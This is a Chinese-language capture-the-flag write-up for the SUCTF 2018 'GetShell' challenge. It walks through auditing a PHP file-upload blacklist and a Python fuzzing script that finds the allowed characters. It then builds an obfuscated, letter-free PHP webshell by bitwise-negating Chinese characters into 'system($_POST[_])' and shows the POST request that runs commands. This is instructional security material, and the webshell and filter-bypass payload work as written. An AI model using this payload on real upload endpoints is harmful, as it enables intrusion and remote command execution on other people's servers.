# [SUCTF 2018]GetShell

#PHP代码审计 #RCE #取反 #waf #文件上传

打开网页发现 upload 文件上传网页。发现源码：

```php
if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
} 
```

- stripos — 查找字符串首次出现的位置（不区分大小写）
- substr($contents,5) 返回 contents 索引为5及以后的字符串

只要我们构造的脚本存在 black_char 里面的字符，上传就失败，所以我们要知道 black_char 里面有哪些字符，编写 fuzz 脚本

```python
import HackRequests

# 可显示字符
def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	return str_list
str_list = ascii_str()

hack = HackRequests.hackRequests()
raw = '''
POST /index.php?act=upload HTTP/1.1
Host: e5df207e-2577-4c46-9ab8-6f153d1a7ffe.node4.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGEajwE83YmdBpDtO

------WebKitFormBoundaryGEajwE83YmdBpDtO
Content-Disposition: form-data; name="file"; filename="1"

12345{0}
------WebKitFormBoundaryGEajwE83YmdBpDtO
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryGEajwE83YmdBpDtO--
'''
for char in str_list:
    hh = hack.httpraw(raw.format(char))
    test_str = hh.text()
    if 'Stored' in test_str:
        print("✅", char)
    else:
        print("❌", char)
```

- 只有 `$ ( ) . ; = [ ] _ ~`，没有被过滤
- HackRequests 模块，见 https://github.com/yym68686/hack-requests，下载文件https://github.com/yym68686/hack-requests/blob/master/HackRequests/HackRequests.py放在目录下，这个版本修复了Content-Length 与请求体真实长度不相等造成请求失败的问题

一个正常的 webshell 脚本应该是

```php
system($_POST[_]);
```

- system — 执行外部程序，并且显示输出

但现在所有的英文字母都不能用，所以要将每一个英文字母替换一下，比如 r 可以表示为

```php
<?php
echo ~'半'[1];
// r
```

所以我们可以通过遍历一个很大的中文字符集，通过取反找到 system 的每一个字母。编写脚本

```php
<?php
error_reporting(0);
 
$s = '你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城';

function mb_str_split( $string ) {
    return preg_split('/(?!^)(?!$)/u', $string); 
}

$shell = "system";
$result = "";
for ($x=0;$x<strlen($shell);$x++) {
	foreach (mb_str_split($s) as $c) {
        if ($shell[$x] == ~($c{1})) {
            $result .= $c;
            break;
        }
	}
}
echo $result;
```

- `(?<!^)(?!$)`匹配所有不是开头结尾的空字符。负向预查语法`(?!pattern)`，要求做匹配的时候，必须不满足pattern这个条件

构造 payload

```php
<?=
$_=([]==[]); // $_ = 1
$__=~区[$_].~冈[$_].~区[$_].~勺[$_].~皮[$_].~针[$_];// $__ = system
$___=~码[$_].~寸[$_].~小[$_].~欠[$_].~立[$_];// $___ = _POST
$__($$___[_]);// system($_POST[_]);
```

- `~'半'[1]` 中的 1 会被过滤，所以使用`[]==[]`代替 1

删掉注释，空格后

```php
<?=
$_=([]==[]);
$__=~区[$_].~冈[$_].~区[$_].~勺[$_].~皮[$_].~针[$_];
$___=~码[$_].~寸[$_].~小[$_].~欠[$_].~立[$_];
$__($$___[_]);
```

上传文件后，构造 POST 请求，用 BurpSuite 发送

```
POST /upload/c47b21fcf8f0bc8b3920541abd8024fd.php HTTP/1.1
Host: f863e2b3-426d-4645-93fe-236eca666763.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded

_=env
```

得到 flag。

Reference

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html